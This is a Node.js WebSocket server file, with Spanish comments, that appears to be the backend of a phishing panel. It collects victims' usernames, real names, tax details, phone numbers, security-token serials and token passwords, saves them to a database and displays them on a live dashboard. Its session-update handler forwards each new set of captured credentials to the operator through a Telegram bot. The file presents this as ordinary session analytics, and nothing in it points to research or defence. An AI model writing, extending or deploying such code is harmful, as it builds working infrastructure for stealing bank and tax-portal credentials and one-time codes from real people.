import { WebSocketServer } from 'ws'
import http from 'http'
import { saveSession, getAllSessions, getConfig, setConfigs } from './database.js'
import { setTelegramConfig, getTelegramConfig, sendTelegramMessage, formatSessionMessage } from './telegram.js'
import securityMiddleware from './security-middleware.js'

// Almacenar todas las sesiones en memoria para acceso rápido
const sessions = new Map()
const clients = new Set()

// Cargar configuración de Telegram al iniciar
try {
  const telegramBotToken = getConfig('telegram_bot_token')
  const telegramChatId = getConfig('telegram_chat_id')
  if (telegramBotToken && telegramChatId) {
    setTelegramConfig(telegramBotToken, telegramChatId)
    console.log('✅ Configuración de Telegram cargada desde BD')
  }
} catch (error) {
  console.error('Error cargando configuración de Telegram:', error)
}

// Cargar sesiones existentes de la base de datos
try {
  const dbSessions = getAllSessions()
  dbSessions.forEach(session => {
    const sessionId = session.session_id
    sessions.set(sessionId, {
      sessionId,
      userId: session.user_id,
      userName: session.user_name,
      realName: session.real_name,
      taxData: session.full_name ? {
        fullName: session.full_name,
        email: session.email,
        mobilePhone: session.mobile_phone,
        landlinePhone: session.landline_phone
      } : undefined,
      tokenSerial: session.token_serial,
      tokenPasswords: session.token_first_pass ? {
        first: session.token_first_pass,
        second: session.token_second_pass
      } : undefined,
      timestamp: session.created_at,
      lastUpdate: session.updated_at
    })
  })
  console.log(`✅ ${sessions.size} sesiones cargadas de la base de datos`)
} catch (error) {
  console.error('Error cargando sesiones:', error)
}

// Crear servidor HTTP con middleware de seguridad
const server = http.createServer((req, res) => {
  // Aplicar middleware de seguridad
  securityMiddleware.applySecurity(req, res, () => {
    // Si pasa la validación de seguridad, responder normalmente
    if (res.statusCode !== 403) {
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ 
        status: 'ok', 
        clients: clients.size, 
        sessions: sessions.size,
        message: 'WebSocket Server está corriendo'
      }))
    }
  })
})

// Manejo de errores del servidor HTTP
server.on('error', (error) => {
  console.error('❌ Error en servidor HTTP:', error)
  if (error.code === 'EADDRINUSE') {
    console.error(`⚠️ Puerto ${PORT} ya está en uso. Cierra el proceso que lo está usando o cambia el puerto.`)
  }
})

// Crear servidor WebSocket
const wss = new WebSocketServer({ 
  server,
  perMessageDeflate: false // Deshabilitar compresión para mejor compatibilidad
})

// Función para broadcast a todos los clientes conectados
function broadcast(data) {
  const message = JSON.stringify(data)
  let sentCount = 0
  let errorCount = 0
  
  const clientsToRemove = []
  
  clients.forEach((client) => {
    if (client.readyState === 1) { // WebSocket.OPEN
      try {
        client.send(message)
        sentCount++
      } catch (error) {
        console.error('Error enviando mensaje a cliente:', error)
        errorCount++
        clientsToRemove.push(client)
      }
    } else {
      clientsToRemove.push(client)
    }
  })
  
  // Remover clientes con problemas
  clientsToRemove.forEach(client => clients.delete(client))
  
  if (sentCount > 0) {
    console.log(`📢 Broadcast: ${sentCount} clientes, ${errorCount} errores`)
  }
  
  return sentCount
}

// Función para actualizar analytics
function updateAnalytics() {
  const allSessions = Array.from(sessions.values())
  return {
    sessions: allSessions,
    analytics: {
      totalSessions: allSessions.length,
      totalLogins: allSessions.filter(s => s.userName).length,
      totalTaxDataSubmissions: allSessions.filter(s => s.taxData).length,
      totalTokenSyncs: allSessions.filter(s => s.tokenSerial).length,
      lastActivity: new Date().toISOString()
    }
  }
}

// Manejar nuevas conexiones
wss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress || 'unknown'
  const clientId = `${clientIp}:${Date.now()}`
  
  // Verificar rate limiting
  if (!securityMiddleware.checkRateLimit(clientIp, 50, 60000)) {
    console.warn(`⚠️ Rate limit excedido para: ${clientIp}`)
    ws.close(1008, 'Rate limit excedido')
    return
  }
  
  // Verificar si es petición sospechosa
  if (securityMiddleware.isSuspiciousRequest(req)) {
    console.warn(`⚠️ Conexión sospechosa bloqueada: ${clientIp}`)
    ws.close(1008, 'Conexión sospechosa')
    return
  }
  
  console.log(`✅ Cliente conectado: ${clientId}`)
  clients.add(ws)

  // Enviar datos iniciales inmediatamente
  try {
    const { sessions: allSessions, analytics } = updateAnalytics()
    const initialData = {
      type: 'initial',
      sessions: allSessions,
      analytics
    }
    ws.send(JSON.stringify(initialData))
    console.log(`📤 Enviadas ${allSessions.length} sesiones a ${clientId}`)
  } catch (error) {
    console.error('❌ Error enviando datos iniciales:', error)
  }

  // Manejar mensajes del cliente
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message.toString())
      console.log(`📨 Mensaje de ${clientId}: ${data.type}`)
      
      handleMessage(ws, data, clientId)
    } catch (error) {
      console.error('❌ Error procesando mensaje:', error)
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Error procesando mensaje: ' + error.message
      }))
    }
  })

  // Manejar cierre de conexión
  ws.on('close', (code, reason) => {
    console.log(`🔌 Cliente desconectado: ${clientId} (código: ${code})`)
    clients.delete(ws)
  })

  // Manejar errores
  ws.on('error', (error) => {
    console.error(`❌ Error en WebSocket ${clientId}:`, error)
    clients.delete(ws)
  })

  // Enviar ping periódico para mantener conexión viva
  const pingInterval = setInterval(() => {
    if (ws.readyState === 1) { // OPEN
      try {
        ws.ping()
      } catch (error) {
        clearInterval(pingInterval)
        clients.delete(ws)
      }
    } else {
      clearInterval(pingInterval)
    }
  }, 30000) // Cada 30 segundos

  ws.on('close', () => {
    clearInterval(pingInterval)
  })
})

// Función para manejar mensajes
function handleMessage(ws, data, clientId) {
  switch (data.type) {
    case 'session_update':
      handleSessionUpdate(ws, data, clientId)
      break

    case 'set_config':
      handleSetConfig(ws, data, clientId)
      break

    case 'get_config':
      handleGetConfig(ws, clientId)
      break

    case 'ping':
      ws.send(JSON.stringify({ type: 'pong' }))
      break

    default:
      console.log(`⚠️ Tipo de mensaje desconocido: ${data.type}`)
      ws.send(JSON.stringify({
        type: 'error',
        message: `Tipo de mensaje desconocido: ${data.type}`
      }))
  }
}

// Manejar actualización de sesión
function handleSessionUpdate(ws, data, clientId) {
  try {
    const sessionId = data.sessionId || `session_${Date.now()}_${Math.random().toString(36).substring(2, 15)}`
    const existingSession = sessions.get(sessionId) || {}
    
    // Combinar datos existentes con nuevos
    const updatedSession = {
      ...existingSession,
      ...data.data,
      sessionId,
      timestamp: existingSession.timestamp || data.timestamp || new Date().toISOString(),
      lastUpdate: new Date().toISOString()
    }
    
    // Merge de datos fiscales y token si existen
    if (data.data?.taxData && existingSession.taxData) {
      updatedSession.taxData = { ...existingSession.taxData, ...data.data.taxData }
    }
    if (data.data?.tokenPasswords && existingSession.tokenPasswords) {
      updatedSession.tokenPasswords = { ...existingSession.tokenPasswords, ...data.data.tokenPasswords }
    }
    
    // Guardar en memoria
    sessions.set(sessionId, updatedSession)
    
    // Guardar en BD
    try {
      saveSession({
        sessionId,
        user: updatedSession.user || updatedSession.userId,
        userName: updatedSession.userName,
        realName: updatedSession.realName,
        taxData: updatedSession.taxData,
        tokenSerial: updatedSession.tokenSerial,
        tokenPasswords: updatedSession.tokenPasswords
      })
    } catch (dbError) {
      console.error('❌ Error guardando en BD:', dbError)
    }
    
    // Enviar notificación a Telegram si hay datos nuevos importantes
    const telegramConfig = getTelegramConfig()
    if (telegramConfig.configured) {
      const hasNewImportantData = 
        (data.data?.taxData && !existingSession.taxData) ||
        (data.data?.tokenSerial && !existingSession.tokenSerial) ||
        (data.data?.userName && !existingSession.userName)
      
      if (hasNewImportantData) {
        const eventType = !existingSession.timestamp ? 'Nueva sesión' : 'Actualización'
        const telegramMessage = formatSessionMessage(updatedSession, eventType)
        sendTelegramMessage(telegramMessage).catch(err => {
          console.error('Error enviando a Telegram:', err)
        })
      }
    }
    
    // Broadcast a todos los clientes
    const { sessions: allSessions, analytics } = updateAnalytics()
    broadcast({
      type: 'session_updated',
      session: updatedSession,
      sessions: allSessions,
      analytics
    })
  } catch (error) {
    console.error('❌ Error en handleSessionUpdate:', error)
    ws.send(JSON.stringify({
      type: 'error',
      message: 'Error procesando actualización de sesión'
    }))
  }
}

// Manejar configuración
function handleSetConfig(ws, data, clientId) {
  try {
    if (!data.config || typeof data.config !== 'object') {
      ws.send(JSON.stringify({
        type: 'config_updated',
        success: false,
        error: 'Configuración inválida'
      }))
      return
    }

    const success = setConfigs(data.config)
    
    if (success) {
      // Actualizar Telegram si se proporcionaron credenciales
      if (data.config.telegram_bot_token || data.config.telegram_chat_id) {
        const botToken = data.config.telegram_bot_token || getConfig('telegram_bot_token')
        const chatId = data.config.telegram_chat_id || getConfig('telegram_chat_id')
        
        if (botToken && chatId) {
          setTelegramConfig(botToken, chatId)
          console.log('✅ Telegram configurado')
          
          // Enviar mensaje de prueba
          sendTelegramMessage('✅ Configuración activada. El dashboard está conectado.')
            .catch(err => console.error('Error enviando mensaje de prueba:', err))
        }
      }
      
      ws.send(JSON.stringify({
        type: 'config_updated',
        success: true,
        message: 'Configuración guardada exitosamente'
      }))
      console.log(`✅ Config guardada por ${clientId}`)
    } else {
      ws.send(JSON.stringify({
        type: 'config_updated',
        success: false,
        error: 'Error al guardar en base de datos'
      }))
    }
  } catch (error) {
    console.error('❌ Error en handleSetConfig:', error)
    ws.send(JSON.stringify({
      type: 'config_updated',
      success: false,
      error: error.message || 'Error desconocido'
    }))
  }
}

// Obtener configuración
function handleGetConfig(ws, clientId) {
  try {
    const config = {
      telegram_bot_token: getConfig('telegram_bot_token') || '',
      telegram_chat_id: getConfig('telegram_chat_id') || ''
    }
    ws.send(JSON.stringify({
      type: 'config',
      config
    }))
    console.log(`📤 Config enviada a ${clientId}`)
  } catch (error) {
    console.error('❌ Error obteniendo config:', error)
    ws.send(JSON.stringify({
      type: 'config',
      config: { telegram_bot_token: '', telegram_chat_id: '' }
    }))
  }
}

// Iniciar servidor
const PORT = process.env.WS_PORT || 3002

server.listen(PORT, '0.0.0.0', () => {
  console.log('')
  console.log('='.repeat(50))
  console.log(`🚀 Servidor WebSocket iniciado`)
  console.log(`📡 Escuchando en: ws://localhost:${PORT}`)
  console.log(`📊 Base de datos SQLite inicializada`)
  console.log(`👥 ${clients.size} clientes conectados`)
  console.log(`📋 ${sessions.size} sesiones cargadas`)
  console.log('='.repeat(50))
  console.log('')
})

// Manejar errores no capturados
process.on('uncaughtException', (error) => {
  console.error('❌ Error no capturado:', error)
})

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Promesa rechazada no manejada:', reason)
})
